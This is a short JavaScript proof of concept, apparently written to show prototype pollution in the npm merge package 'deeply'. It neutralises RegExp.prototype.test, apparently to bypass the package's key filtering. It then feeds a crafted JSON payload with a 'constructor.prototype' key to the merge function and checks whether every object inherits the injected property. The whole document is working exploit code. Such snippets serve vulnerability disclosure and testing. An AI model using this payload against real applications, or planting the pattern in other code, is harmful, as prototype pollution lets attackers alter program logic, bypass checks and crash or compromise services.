RegExp.prototype.test = () => false;
const mergeFn = require('deeply');
const payload = '{"constructor.prototype": {"polluted":"yes"}}';
var obj = {};
console.log({}.polluted);
mergeFn({}, JSON.parse(payload));
console.log({}.polluted);